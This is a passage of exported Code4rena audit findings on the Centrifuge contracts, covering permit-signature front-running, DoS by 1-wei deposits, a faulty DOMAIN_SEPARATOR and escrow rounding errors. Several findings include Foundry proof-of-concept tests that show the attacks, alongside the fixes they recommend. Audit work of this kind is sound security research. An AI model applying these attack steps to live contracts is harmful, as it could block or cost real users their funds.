Report", "html_url": "https://github.com/code-423n4/2023-09-centrifuge-findings/issues/548", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-18"], "target": "2023-09-centrifuge-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-09-centrifuge-findings/blob/main/data/castle_chain-Q.md)."}, {"title": "onlyCentrifugeChainOrigin() can't require msg.sender equal axelarGateway", "html_url": "https://github.com/code-423n4/2023-09-centrifuge-findings/issues/537", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-09-centrifuge-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-09-centrifuge/blob/512e7a71ebd9ae76384f837204216f26380c9f91/src/gateway/routers/axelar/Router.sol#L44   # Vulnerability details  ## Vulnerability details  In `AxelarRouter.sol`, we need to ensure the legitimacy of the `execute()` method execution, mainly through two methods 1. `axelarGateway.validateContractCall ()` to validate if the `command` is approved or not 2. `onlyCentrifugeChainOrigin()` is used to validate that `sourceChain` `sourceAddress` is legal.  Let's look at the implementation of `onlyCentrifugeChainOrigin()`  ```solidity     modifier onlyCentrifugeChainOrigin(string calldata sourceChain, string calldata sourceAddress) {         @>      require(msg.sender == address(axelarGateway), \"AxelarRouter/invalid-origin\");         require(             keccak256(bytes(axelarCentrifugeChainId)) == keccak256(bytes(sourceChain)),             \"AxelarRouter/invalid-source-chain\"         );         require(             keccak256(bytes(axelarCentrifugeChainAddress)) == keccak256(bytes(sourceAddress)),             \"AxelarRouter/invalid-source-address\"         );         _;     } ```  The problem is that this restriction `msg.sender == address(axelarGateway)`  When we look at the official `axelarGateway.sol` contract, it doesn't provide any call external contract 's`execute()` method  so `msg.sender` cannot be `axelarGateway`, and the official example does not restrict `msg.sender`  the security of the command can be guaranteed by `axelarGateway.validateContractCall()`, `sourceChain`, `sourceAddress`.  there is no need to restrict `msg.sender`  `axelarGateway` code address  https://github.com/axelarnetwork/axelar-cgp-solidity/blob/main/contracts/AxelarGateway.sol  can't find anything that calls `router.execute()`   ## Impact  `router.execute()` cannot be executed properly, resulting in commands from other chains not being executed\uff0c protocol not working properly   ## Recommended Mitigation  remove `msg.sender` restriction  ```diff     modifier onlyCentrifugeChainOrigin(string calldata sourceChain, string calldata sourceAddress) {         -       require(msg.sender == address(axelarGateway), \"AxelarRouter/invalid-origin\");         require(             keccak256(bytes(axelarCentrifugeChainId)) == keccak256(bytes(sourceChain)),             \"AxelarRouter/invalid-source-chain\"         );         require(             keccak256(bytes(axelarCentrifugeChainAddress)) == keccak256(bytes(sourceAddress)),             \"AxelarRouter/invalid-source-address\"         );         _;     } ```   ## Assessed type  Context"}, {"title": "Calling of  LiquidityPool#requestDepositWithPermit() or LiquidityPool#requestRedeemWithPermit() could be failed due to a frontrun of a call to ERC20PermitLike.permit()", "html_url": "https://github.com/code-423n4/2023-09-centrifuge-findings/issues/468", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed", "sufficient quality report", "edited-by-warden", "Q-23"], "target": "2023-09-centrifuge-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L220-L226 https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L237-L243   # Vulnerability details  ## Impact Anyone can call `ERC20PermitLike(token).permit()` to verify signed message and update corresponding allowance mapping. The signed message can only be permitted one time, any attempt to permit it again will be reverted. Hence malicious user could frontrun `ERC20PermitLike(token).permit()` with signed message to block calling of `LiquidityPool#requestDepositWithPermit()` or `LiquidityPool#requestRedeemWithPermit()`.   ## Proof of Concept Add below codes before [line 944 of LiquidityPool.t.sol](https://github.com/code-423n4/2023-09-centrifuge/blob/main/test/LiquidityPool.t.sol#L944) and run test case, `LiquidityPool#requestDepositWithPermit()` will be reverted:      erc20.permit(investor, address(investmentManager), amount, block.timestamp, v, r, s);  Add below codes before [line 991 of LiquidityPool.t.sol](https://github.com/code-423n4/2023-09-centrifuge/blob/main/test/LiquidityPool.t.sol#L991) and run test case, `LiquidityPool#requestRedeemWithPermit()` will be reverted:      trancheToken.permit(investor, address(investmentManager), maxMint, block.timestamp, v, r, s);  ## Tools Used Manual review  ## Recommended Mitigation Steps Check allowance before calling `permit()` in [`LiquidityPool#requestDepositWithPermit()`](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L220-L226) and [`LiquidityPool#requestRedeemWithPermit()`](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L237-L243) as [Uniswap did](https://github.com/Uniswap/v3-periphery/blob/main/contracts/base/SelfPermit.sol#L28-L37):      function requestDepositWithPermit(uint256 assets, address owner, uint256 deadline, uint8 v, bytes32 r, bytes32 s)         public     {         if (IERC20(asset).allowance(owner, address(investmentManager)) < assets) {             ERC20PermitLike(asset).permit(owner, address(investmentManager), assets, deadline, v, r, s);         }         investmentManager.requestDeposit(assets, owner);         emit DepositRequested(owner, assets);     }      function requestRedeemWithPermit(uint256 shares, address owner, uint256 deadline, uint8 v, bytes32 r, bytes32 s)//@audit-ok         public     {         if (share.allowance(owner, address(investmentManager)) < shares) {             share.permit(owner, address(investmentManager), shares, deadline, v, r, s);//@audit-info check if signature is signed by owner and combined by all parameters.         }         investmentManager.requestRedeem(shares, owner);//@audit-info requestRedeem if signature is valid         emit RedeemRequested(owner, shares);     }        ## Assessed type  Other"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-09-centrifuge-findings/issues/397", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-29"], "target": "2023-09-centrifuge-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-09-centrifuge-findings/blob/main/data/0xmystery-Q.md)."}, {"title": "Unchecked Return Values of PoolManager::isAllowedAsPoolCurrency()", "html_url": "https://github.com/code-423n4/2023-09-centrifuge-findings/issues/246", "labels": ["bug", "downgraded by judge", "grade-b", "low quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-24"], "target": "2023-09-centrifuge-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-09-centrifuge/blob/512e7a71ebd9ae76384f837204216f26380c9f91/src/InvestmentManager.sol#L124, https://github.com/code-423n4/2023-09-centrifuge/blob/512e7a71ebd9ae76384f837204216f26380c9f91/src/InvestmentManager.sol#L154   # Vulnerability details  ## Impact The interface used in src\\InvestmentManager.sol ```solidity interface PoolManagerLike {     ...     function isAllowedAsPoolCurrency(uint64 poolId, address currencyAddress) external view returns (bool); } ``` function returns `bool`, but the check is not executed. Token (`currency`) that is not supported in Centrifuge pool will be used in _InvestmentManager::requestRedeem()_ and _InvestmentManager::requestDeposit()_. In other contracts, the check is performed. In this case, it was probably forgotten to be performed.  Line 124: `poolManager.isAllowedAsPoolCurrency(lPool.poolId(), currency);` Line 154: `poolManager.isAllowedAsPoolCurrency(lPool.poolId(), lPool.asset());`  ## Proof of Concept  At the moment _PoolManager::isAllowedAsPoolCurrency()_ will always return `true` or `revert()` will occur. But if the PoolManager logic is changed so that `true`/`false` is returned and the `address poolManager` is updated with _InvestmentManager::file()_, the Token (`currency`) that is not supported in Centrifuge pool will be used in _InvestmentManager::requestRedeem()_ and _InvestmentManager::requestDeposit()_.  ## Tools Used Manual analysis  ## Recommended Mitigation Steps Change from Line 124: `poolManager.isAllowedAsPoolCurrency(lPool.poolId(), currency);` Line 154: `poolManager.isAllowedAsPoolCurrency(lPool.poolId(), lPool.asset());` to  Line 124: `requre(poolManager.isAllowedAsPoolCurrency(lPool.poolId(), currency), \"PoolManager/currency-not-supported\")` Line 154: `requre(poolManager.isAllowedAsPoolCurrency(lPool.poolId(), lPool.asset()), \"PoolManager/currency-not-supported\")`   ## Assessed type  Invalid Validation"}, {"title": "`LiquidityPool::requestRedeemWithPermit` transaction can be front run with the different liquidity pool", "html_url": "https://github.com/code-423n4/2023-09-centrifuge-findings/issues/227", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-09-centrifuge-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-09-centrifuge/blob/512e7a71ebd9ae76384f837204216f26380c9f91/src/LiquidityPool.sol#L240   # Vulnerability details  ## Impact The permit signature is linked only to the tranche token. That's why it can be used with any liquidity pool with the same tranche token. Since anyone can call `LiquidityPool::requestRedeemWithPermit` the following scenario is possible: 1. Let's assume that some user has some amount of tranche tokens. Let's also assume that there are multiple liquidity pools with the same tranche token. For example, USDX pool and USDY pool. 2. The user wants to redeem USDX from the USDX pool using `requestRedeemWithPermit`. The user signs the permit and sends a transaction. 3. A malicious actor can see this transaction in the mempool and use the signature from it to request a redemption from the USDY pool with a greater fee amount. 4. Since this transaction has a greater fee amount it will likely be executed before the valid transaction. 5. The user's transaction will be reverted since the permit has already been used. 6. If the user will not cancel this malicious request until the end of the epoch this request will be executed, and the user will be forced to claim USDY instead of USDX.  This scenario assumes some user's negligence and usually doesn't lead to a significant loss. But in some cases (for example, USDY depeg) a user can end up losing significantly.  ## Proof of Concept The test below illustrates the scenario described above: ```solidity function testPOCIssue1(     uint64 poolId,     string memory tokenName,     string memory tokenSymbol,     bytes16 trancheId,     uint128 currencyId,     uint256 amount ) public {     vm.assume(currencyId > 0);     vm.assume(amount < MAX_UINT128);     vm.assume(amount > 1);      // Use a wallet with a known private key so we can sign the permit message     address investor = vm.addr(0xABCD);     vm.prank(vm.addr(0xABCD));      LiquidityPool lPool =         LiquidityPool(deployLiquidityPool(poolId, erc20.decimals(), tokenName, tokenSymbol, trancheId, currencyId));     erc20.mint(investor, amount);     homePools.updateMember(poolId, trancheId, investor, type(uint64).max);      // Sign permit for depositing investment currency     (uint8 v, bytes32 r, bytes32 s) = vm.sign(         0xABCD,         keccak256(             abi.encodePacked(                 \"\\x19\\x01\",                 erc20.DOMAIN_SEPARATOR(),                 keccak256(                     abi.encode(                         erc20.PERMIT_TYPEHASH(), investor, address(investmentManager), amount, 0, block.timestamp                     )                 )             )         )     );      lPool.requestDepositWithPermit(amount, investor, block.timestamp, v, r, s);     // To avoid stack too deep errors     delete v;     delete r;     delete s;      // ensure funds are locked in escrow     assertEq(erc20.balanceOf(address(escrow)), amount);     assertEq(erc20.balanceOf(investor), 0);      // collect 50% of the tranche tokens     homePools.isExecutedCollectInvest(         poolId,         trancheId,         bytes32(bytes20(investor)),         poolManager.currencyAddressToId(address(erc20)),         uint128(amount),         uint128(amount)     );      uint256 maxMint = lPool.maxMint(investor);     lPool.mint(maxMint, investor);      {         TrancheToken trancheToken = TrancheToken(address(lPool.share()));         assertEq(trancheToken.balanceOf(address(investor)), maxMint);          // Sign permit for redeeming tranche tokens         (v, r, s) = vm.sign(             0xABCD,             keccak256(                 abi.encodePacked(                     \"\\x19\\x01\",                     trancheToken.DOMAIN_SEPARATOR(),                     keccak256(                         abi.encode(                             trancheToken.PERMIT_TYPEHASH(),                             investor,                             address(investmentManager),                             maxMint,                             0,                             block.timestamp                         )                     )                 )             )         );     }      // Let's assume that there is another liquidity pool with the same poolId and trancheId     // but a different currency     LiquidityPool newLPool;     {         assert(currencyId != 123);         address newErc20 = address(_newErc20(\"Y's Dollar\", \"USDY\", 6));         homePools.addCurrency(123, newErc20);         homePools.allowPoolCurrency(poolId, 123);         newLPool = LiquidityPool(poolManager.deployLiquidityPool(poolId, trancheId, newErc20));     }     assert(address(lPool) != address(newLPool));          // Malicious actor can use the signature extracted from the mempool to      // request redemption from the different liquidity pool     vm.prank(makeAddr(\"malicious\"));     newLPool.requestRedeemWithPermit(maxMint, investor, block.timestamp, v, r, s);      // User's transaction will fail since the signature has already been used     vm.expectRevert();     lPool.requestRedeemWithPermit(maxMint, investor, block.timestamp, v, r, s); } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps One of the ways to mitigate this issue is to add some identifier of the liquidity pool to the permit message. This way permit will be linked to a specific liquidity pool.   ## Assessed type  Other"}, {"title": "Cached `DOMAIN_SEPARATOR` is incorrect for tranche tokens potentially breaking permit integrations", "html_url": "https://github.com/code-423n4/2023-09-centrifuge-findings/issues/146", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-04"], "target": "2023-09-centrifuge-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-09-centrifuge/blob/512e7a71ebd9ae76384f837204216f26380c9f91/src/util/Factory.sol#L81-L109 https://github.com/code-423n4/2023-09-centrifuge/blob/512e7a71ebd9ae76384f837204216f26380c9f91/src/token/ERC20.sol#L42-L49 https://github.com/code-423n4/2023-09-centrifuge/blob/512e7a71ebd9ae76384f837204216f26380c9f91/src/token/ERC20.sol#L225-L231   # Vulnerability details  ## Impact Attempts to interact with tranche tokens via `permit` may always revert.  ## Proof of Concept When new tranche tokens are deployed, the initial `DOMAIN_SEPARATOR` is calculated and cached in the constructor. https://github.com/code-423n4/2023-09-centrifuge/blob/512e7a71ebd9ae76384f837204216f26380c9f91/src/token/ERC20.sol#L42-L49 ```solidity     constructor(uint8 decimals_) {         ...         deploymentChainId = block.chainid;         _DOMAIN_SEPARATOR = _calculateDomainSeparator(block.chainid);     } ``` This uses an empty string since `name` is only set after deployment. https://github.com/code-423n4/2023-09-centrifuge/blob/512e7a71ebd9ae76384f837204216f26380c9f91/src/util/Factory.sol#L81-L109 ```solidity     function newTrancheToken(         uint64 poolId,         bytes16 trancheId,         string memory name,         string memory symbol,         uint8 decimals,         address[] calldata trancheTokenWards,         address[] calldata restrictionManagerWards     ) public auth returns (address) {         ...         TrancheToken token = new TrancheToken{salt: salt}(decimals);          token.file(\"name\", name);         ...     } ``` Consequently, the domain separator is incorrect (when `block.chainid == deploymentChainId` where the domain separator is not recalculated) and will cause reverts when signatures for `permit` are attempted to be constructed using the tranche token's `name` (which will not be empty).  It should also be noted that the tranche token `name` could be changed by a call to `updateTranchTokenMetadata` which may also introduce complications with the domain separator.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Consider setting the name in the constructor before the cached domain separator is calculated.      ## Assessed type  Other"}, {"title": "You can deposit for other users really small amount to DoS them", "html_url": "https://github.com/code-423n4/2023-09-centrifuge-findings/issues/143", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "sufficient quality report", "M-05"], "target": "2023-09-centrifuge-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L141-L152   # Vulnerability details  ## Impact Deposit and mint under [**LiquidityPool**](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L141-L152) lack access control, which enables any user to **proceed** the  mint/deposit for another user. Attacker can deposit (this does not require tokens) some wai before users TX to DoS the deposit.  ## Proof of Concept [deposit](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L141-L144) and [mint](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L148-L152) do [processDeposit](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L427-L441)/[processMint](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L451-L465) which are the secondary functions to the requests. These function do not take any value in the form of tokens, but only send shares to the receivers. This means they can be called for free.   With this an attacker who wants to DoS a user, can wait him to make the request to deposit and on the next epoch front run him by calling  [deposit](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L141-L144) with something small like 1 wei. Afterwards when the user calls `deposit`, his TX will inevitable revert, as he will not have enough balance for the full deposit.    ## Tools Used Manual review.  ## Recommended Mitigation Steps Have some access control modifiers like [**withApproval**](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L97-L100) used also in [redeem](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L200-L208).  ```diff -    function deposit(uint256 assets, address receiver) public returns (uint256 shares)  { +    function deposit(uint256 assets, address receiver) public returns (uint256 shares) withApproval(receiver) {         shares = investmentManager.processDeposit(receiver, assets);         emit Deposit(address(this), receiver, assets, shares);      }  -    function mint(uint256 shares, address receiver) public returns (uint256 assets) { +    function mint(uint256 shares, address receiver) public returns (uint256 assets) withApproval(receiver) {         assets = investmentManager.processMint(receiver, shares);         emit Deposit(address(this), receiver, assets, shares);      } ```   ## Assessed type  Access Control"}, {"title": "Investors claiming their maxDeposit by using the LiquidityPool.deposit() will cause that other users won't be able to claim their maxDeposit/maxMint", "html_url": "https://github.com/code-423n4/2023-09-centrifuge-findings/issues/118", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-09-centrifuge-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L141-L144 https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L427-L441   # Vulnerability details  ## Impact - Claiming deposits using the [`LiquidityPool.deposit()`](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L141-L144) will cause the Escrow contract doesn't have enough shares to allow other investors to claim their maxDeposit or maxMint values for their deposited assets  ## Proof of Concept - Before an investor can claim their deposits, they first needs to request the deposit and wait for the Centrigue Chain to validate it in the next epoch. - Investors can request deposits at different epochs without the need to claim all the approved deposits before requesting a new deposit, in the end, the maxDeposit and maxMint values that the investor can claim will be increased accordingly based on all the request deposits that the investor makes.  - When the requestDeposit of the investor is processed in the Centrifuge chain, a number of TrancheShares will be minted based on the price at the moment when the request was processed and the total amount of deposited assets, this TrancheShares will be deposited to the Escrow contract, and the TrancheShares will be waiting for the investors to claim their deposits.  - When investors decide to claim their deposit they can use the [`LiquidityPool.deposit()`](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L141-L144) function, this function receives as arguments the number of assets that are being claimed and the address of the account to claim the deposits for. ```solidity function deposit(uint256 assets, address receiver) public returns (uint256 shares) {     shares = investmentManager.processDeposit(receiver, assets);     emit Deposit(address(this), receiver, assets, shares); } ``` - The [`LiquidityPool.deposit()`](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L141-L144) function calls the [`InvestmentManager::processDeposit()`](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L427-L441) which will validate that the amount of assets being claimed doesn't exceed the investor's deposit limits, will compute the deposit price in the [`InvestmentManager::calculateDepositPrice()`](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L551-L558), which basically computes an average price for all the request deposits that have been accepted in the Centrifuge Chain, each of those request deposits could've been executed at a different price, so, this function, based on the values of maxDeposit and maxMint will estimate an average price for all the unclaimed deposits, later, using this computed price for the deposits will compute the equivalent of TrancheTokens for the CurrencyAmount being claimed, and finally, processDeposit() will transferFrom the escrow to the investor account the computed amount of TranchTokens. ```solidity function processDeposit(address user, uint256 currencyAmount) public auth returns (uint256 trancheTokenAmount) {     address liquidityPool = msg.sender;     uint128 _currencyAmount = _toUint128(currencyAmount);     require(         //@audit-info => orderbook[][].maxDeposit is updated when the handleExecutedCollectInvest() was executed!         //@audit-info => The orderbook keeps track of the number of TrancheToken shares that have been minted to the Escrow contract on the user's behalf!         (_currencyAmount <= orderbook[user][liquidityPool].maxDeposit && _currencyAmount != 0),         \"InvestmentManager/amount-exceeds-deposit-limits\"     );      //@audit-info => computes an average price for all the request deposits that have been accepted in the Centrifuge Chain and haven't been claimed yet!     uint256 depositPrice = calculateDepositPrice(user, liquidityPool);     require(depositPrice != 0, \"LiquidityPool/deposit-token-price-0\");      //@audit-info => Based on the computed depositPrice will compute the equivalent of TrancheTokens for the CurrencyAmount being claimed     uint128 _trancheTokenAmount = _calculateTrancheTokenAmount(_currencyAmount, liquidityPool, depositPrice);      //@audit-info => transferFrom the escrow to the investor account the computed amount of TranchTokens.     _deposit(_trancheTokenAmount, _currencyAmount, liquidityPool, user);     trancheTokenAmount = uint256(_trancheTokenAmount); } ```  **The problem** occurs when an investor hasn't claimed their deposits and has requested multiple deposits on different epochs at different prices. The [`InvestmentManager::calculateDepositPrice()`](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L551-L558) function will compute an equivalent/average price for all the requestDeposits that haven't been claimed yet. Because of the different prices that the request deposits where processed at, the computed price will compute the most accurate average of the deposit's price, but there is a slight rounding error that causes the computed value of trancheTokenAmount to be slightly different from what it should exactly be. - That slight difference will make that the Escrow contract transfers slightly more shares to the investor claiming the deposits by using the [`LiquidityPool.deposit()`](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L141-L144) - **As a result**, when another investor tries to claim their [maxDeposit](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L129-L132) or [maxMint](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L154-L157), now the Escrow contract doesn't have enough shares to make whole the request of the other investor, and as a consequence the other investor transaction will be reverted. That means the second investor won't be able to claim all the shares that it is entitled to claim because the Escrow contract doesn't have all those shares anymore.  ### Coded PoC - I used the [`LiquidityPool.t.sol`](https://github.com/code-423n4/2023-09-centrifuge/blob/main/test/LiquidityPool.t.sol) test file as the base file for this PoC, please add the below testPoC to the LiquidityPool.t.sol file  - In this PoC I demonstrate that Alice (A second investor) won't be able to claim her maxDeposit or maxMint amounts after the first investor uses the [`LiquidityPool.deposit()`](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L141-L144) function to claim his [maxDeposit() assets](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L129-L132). The first investor makes two requestDeposit, each of them at a different epoch and at a different price, Alice on the other hand only does 1 requestDeposit in the second epoch.  - Run this PoC two times, check the comments on the last 4 lines, one time we want to test Alice claiming her deposits using LiquidityPool::deposit(), and the second time using LiquidityPool::mint()   - The two executions should fail with the same problem.  ```solidity     function testDepositAtDifferentPricesPoC(uint64 poolId, bytes16 trancheId, uint128 currencyId) public {         vm.assume(currencyId > 0);          uint8 TRANCHE_TOKEN_DECIMALS = 18; // Like DAI         uint8 INVESTMENT_CURRENCY_DECIMALS = 6; // 6, like USDC          ERC20 currency = _newErc20(\"Currency\", \"CR\", INVESTMENT_CURRENCY_DECIMALS);         address lPool_ =             deployLiquidityPool(poolId, TRANCHE_TOKEN_DECIMALS, \"\", \"\", trancheId, currencyId, address(currency));         LiquidityPool lPool = LiquidityPool(lPool_);         homePools.updateTrancheTokenPrice(poolId, trancheId, currencyId, 1000000000000000000);          //@audit-info => Add Alice as a Member         address alice = address(0x23232323);         homePools.updateMember(poolId, trancheId, alice, type(uint64).max);          // invest         uint256 investmentAmount = 100000000; // 100 * 10**6         homePools.updateMember(poolId, trancheId, self, type(uint64).max);         currency.approve(address(investmentManager), investmentAmount);         currency.mint(self, investmentAmount);         lPool.requestDeposit(investmentAmount, self);          // trigger executed collectInvest at a price of 1.25         uint128 _currencyId = poolManager.currencyAddressToId(address(currency)); // retrieve currencyId         uint128 currencyPayout = 100000000; // 100 * 10**6                                                   uint128 firstTrancheTokenPayout = 80000000000000000000; // 100 * 10**18 / 1.25, rounded down         homePools.isExecutedCollectInvest(             poolId, trancheId, bytes32(bytes20(self)), _currencyId, currencyPayout, firstTrancheTokenPayout         );          // assert deposit & mint values adjusted         assertEq(lPool.maxDeposit(self), currencyPayout);         assertEq(lPool.maxMint(self), firstTrancheTokenPayout);          // deposit price should be ~1.25*10**18 === 1250000000000000000         assertEq(investmentManager.calculateDepositPrice(self, address(lPool)), 1250000000000000000);           // second investment in a different epoch => different price         currency.approve(address(investmentManager), investmentAmount);         currency.mint(self, investmentAmount);         lPool.requestDeposit(investmentAmount, self);          // trigger executed collectInvest at a price of 2         currencyPayout = 100000000; // 100 * 10**6         uint128 secondTrancheTokenPayout = 50000000000000000000; // 100 * 10**18 / 1.4, rounded down         homePools.isExecutedCollectInvest(             poolId, trancheId, bytes32(bytes20(self)), _currencyId, currencyPayout, secondTrancheTokenPayout         );          // Alice invests the same amount as the other investor in the second epoch - Price is at 2         currency.mint(alice, investmentAmount);          vm.startPrank(alice);         currency.approve(address(investmentManager), investmentAmount);         lPool.requestDeposit(investmentAmount, alice);         vm.stopPrank();          homePools.isExecutedCollectInvest(             poolId, trancheId, bytes32(bytes20(alice)), _currencyId, currencyPayout, secondTrancheTokenPayout         );          uint128 AliceTrancheTokenPayout = 50000000000000000000; // 100 * 10**18 / 1.4, rounded down          //@audit-info => At this point, the Escrow contract should have the firstTrancheTokenPayout + secondTrancheTokenPayout + AliceTrancheTokenPayout         assertEq(lPool.balanceOf(address(escrow)),firstTrancheTokenPayout + secondTrancheTokenPayout + AliceTrancheTokenPayout);           // Investor collects his the deposited assets using the LiquidityPool::deposit()         lPool.deposit(lPool.maxDeposit(self), self);                   // Alice tries to collect her deposited assets and gets her transactions reverted because the Escrow doesn't have the required TokenShares for Alice!         vm.startPrank(alice);          //@audit-info => Run the PoC one time to test Alice trying to claim their deposit using LiquidityPool.deposit()         lPool.deposit(lPool.maxDeposit(alice), alice);                  //@audit-info => Run the PoC a second time, but now using LiquidityPool.mint()         // lPool.mint(lPool.maxMint(alice), alice);         vm.stopPrank();     } ```    ## Tools Used Manual Audit  ## Recommended Mitigation Steps - I'd recommend to add a check to the computed value of the [`_trancheTokenAmount`](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L438) in the `InvestmentManager::processDeposit()`, if the `_trancheTokenAmount` exceeds the `maxMint()` of the user, update it and set it to be the maxMint(), in this way, the rounding differences will be discarded before doing the actual transfer of shares from the Escrow to the user, and this will prevent the Escrow from not having all the required TranchToken for the other investors ```solidity function processDeposit(address user, uint256 currencyAmount) public auth returns (uint256 trancheTokenAmount) {     address liquidityPool = msg.sender;     uint128 _currencyAmount = _toUint128(currencyAmount);     require(         (_currencyAmount <= orderbook[user][liquidityPool].maxDeposit && _currencyAmount != 0),         \"InvestmentManager/amount-exceeds-deposit-limits\"     );      uint256 depositPrice = calculateDepositPrice(user, liquidityPool);     require(depositPrice != 0, \"LiquidityPool/deposit-token-price-0\");      uint128 _trancheTokenAmount = _calculateTrancheTokenAmount(_currencyAmount, liquidityPool, depositPrice);          //@audit => Add this check to prevent any rounding errors from causing problems when transfering shares from the Escrow to the Investor! +   if (_trancheTokenAmount > orderbook[user][liquidityPool].maxMint) _trancheTokenAmount = orderbook[user][liquidityPool].maxMint;          _deposit(_trancheTokenAmount, _currencyAmount, liquidityPool, user);     trancheTokenAmount = uint256(_trancheTokenAmount); } ```  - After applying the suggested recommendation, you can use the provided PoC on this report to verify that the problem has been solved.   ## Assessed type  Math"}, {"title": "DelayedAdmin Cannot `PauseAdmin.removePauser`", "html_url": "https://github.com/code-423n4/2023-09-centrifuge-findings/issues/92", "labels": ["bug", "2 (Med Risk)", "low quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-07"], "target": "2023-09-centrifuge-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/admins/DelayedAdmin.sol#L1-L41 https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/admins/PauseAdmin.sol#L39-L42 https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/util/Auth.sol#L1-L30 https://github.com/code-423n4/2023-09-centrifuge/blob/main/README.md?plain=1#L74-L77   # Vulnerability details  ## Impact As per the contest repository's documentation, which is confirmed as up-to-date, there are carefully considered emergency scenarios. Among these scenarios, one is described as follows:  https://github.com/code-423n4/2023-09-centrifuge/blob/main/README.md?plain=1#L74-L77: ``` **Someone controls 1 pause admin and triggers a malicious `pause()`**  * The delayed admin is a `ward` on the pause admin and can trigger `PauseAdmin.removePauser`. * It can then trigger `root.unpause()`. ```  That makes perfect sense from a security perspective. However the provided `DelayedAdmin` implementation lacks the necessary functionality to execute `PauseAdmin.removePauser` in the case of an emergency.  Striving to adhere to the documented [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization), I have categorized this as Medium instead of Low. The reason is that it does not qualify as Low due to representing both a \"function incorrect as to spec\" issue and a critical feature missing from the project's security model. Without this emergency action for `PauseAdmin`, other recovery paths may have to wait for `Root`'s delay period or, at least temporarily, change the protocol's security model to make a recovery. In my view, this aligns with the \"Assets not at direct risk, but the function of the protocol or its availability could be impacted\" requirement for Medium severity. With that said, I realize the sponsors and judges will ultimately evaluate and categorise it based on their final risk analysis, not mine. I'm simply streamlining the process by presenting my perspective in advance.  ## Proof of Concept In order to remove a pauser from the `PauseAdmin` contract, the `removePause` function must be called:  https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/admins/PauseAdmin.sol#L39-L42: ```c++     function removePauser(address user) external auth {         pausers[user] = 0;         emit RemovePauser(user);     } ```  Since it is a short contract, here is the whole `DelayedAdmin` implementation:  https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/admins/DelayedAdmin.sol ```c++ // SPDX-License-Identifier: AGPL-3.0-only pragma solidity 0.8.21;  import {Root} from \"../Root.sol\"; import {Auth} from \"./../util/Auth.sol\";  /// @title  Delayed Admin /// @dev    Any ward on this contract can trigger ///         instantaneous pausing and unpausing ///         on the Root, as well as schedule and cancel ///         new relys through the timelock. contract DelayedAdmin is Auth {     Root public immutable root;      // --- Events ---     event File(bytes32 indexed what, address indexed data);      constructor(address root_) {         root = Root(root_);          wards[msg.sender] = 1;         emit Rely(msg.sender);     }      // --- Admin actions ---     function pause() public auth {         root.pause();     }      function 